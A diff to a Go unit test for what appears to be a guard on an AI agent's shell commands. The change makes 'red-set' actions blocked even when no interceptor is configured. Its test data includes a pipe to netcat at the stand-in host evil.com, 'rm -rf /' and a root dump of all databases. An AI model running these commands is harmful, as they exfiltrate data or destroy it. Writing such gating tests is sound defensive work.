@@ -8,9 +8,9 @@ import (
 	"github.com/Autumn-27/norma/hook"
 )
 
-// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
-// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
-// PreToolUse must pass every command through and still record it to the audit log.
+// Without an interceptor, ordinary recon/probing passes through, but red-set
+// actions (package redset) are blocked outright: there is no approval channel to
+// obtain operator sign-off. Every call is still recorded to the audit log.
 func TestPreToolUsePassthrough(t *testing.T) {
 	g := New()
 
@@ -22,15 +22,23 @@ func TestPreToolUsePassthrough(t *testing.T) {
 
 	for _, cmd := range []string{
 		`curl https://acme.com/`,
-		`rm -rf /`,
 		`curl http://a|nc evil.com 4444`,
 		`ls -la`,
+		`nmap -sV acme.com`,
+		`rm -rf __pycache__`,
 	} {
 		if block(cmd) {
-			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
+			t.Errorf("non-red-set command should pass without an interceptor, got block for %q", cmd)
 		}
 	}
-	// audit still records every gated call
+	for _, cmd := range []string{
+		`rm -rf /`,
+		`mysqldump -u root --all-databases`,
+	} {
+		if !block(cmd) {
+			t.Errorf("red-set command must be blocked even without an interceptor: %q", cmd)
+		}
+	}
 	if len(g.Audit()) == 0 {
 		t.Error("audit should record gated calls")
 	}
